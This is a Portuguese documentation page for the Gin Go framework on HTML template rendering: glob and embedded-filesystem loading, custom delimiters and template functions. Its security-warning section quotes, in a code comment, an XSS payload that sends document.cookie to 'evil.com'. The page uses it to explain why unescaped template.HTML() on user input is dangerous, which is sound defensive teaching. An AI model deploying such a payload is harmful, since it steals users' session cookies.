---
title: "Renderização HTML"
sidebar:
  order: 9
---

O Gin usa o pacote [html/template](https://pkg.go.dev/html/template) para renderização HTML.
Para mais informações sobre como usá-los, incluindo placeholders disponíveis, veja a documentação de [text/template](https://pkg.go.dev/text/template).

Use LoadHTMLGlob() ou LoadHTMLFiles() para selecionar os arquivos HTML a carregar.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

Usando templates com o mesmo nome em diretórios diferentes

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**Nota:** Por favor, envolva seu template HTML no bloco `{{define <template-path>}} {{end}}` e defina seu arquivo de template com o caminho relativo `<template-path>`. Caso contrário, o GIN não analisará corretamente os arquivos de template.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### Carregando templates de um http.FileSystem (v1.11+)

Se seus templates estão incorporados ou fornecidos por um `http.FileSystem`, use `LoadHTMLFS`:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### Aviso de segurança: `template.HTML()` ignora o escape automático

O pacote `html/template` do Go escapa automaticamente valores inseridos em templates para prevenir Cross-Site Scripting (XSS). No entanto, quando você converte uma string para `template.HTML()`, você ignora explicitamente essa proteção. Se a string contiver entrada fornecida pelo usuário, um atacante pode injetar JavaScript arbitrário.

**Inseguro -- nunca use `template.HTML()` com entrada do usuário:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**Seguro -- deixe o motor de template escapar a entrada do usuário automaticamente:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

Use `template.HTML()` apenas para conteúdo que você controla completamente, como trechos de HTML estáticos definidos no seu próprio código. Nunca use com valores que originam de entrada do usuário, campos de banco de dados preenchidos por usuários ou qualquer outra fonte não confiável.

### Renderizador de template customizado

Você também pode usar seu próprio renderizador de template HTML.

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### Delimitadores customizados

Você pode usar delimitadores personalizados.

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### Funções de template customizadas

Veja o [código de exemplo](https://github.com/gin-gonic/examples/tree/master/template) detalhado.

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

Resultado:

```sh
Date: 2017/07/01
```
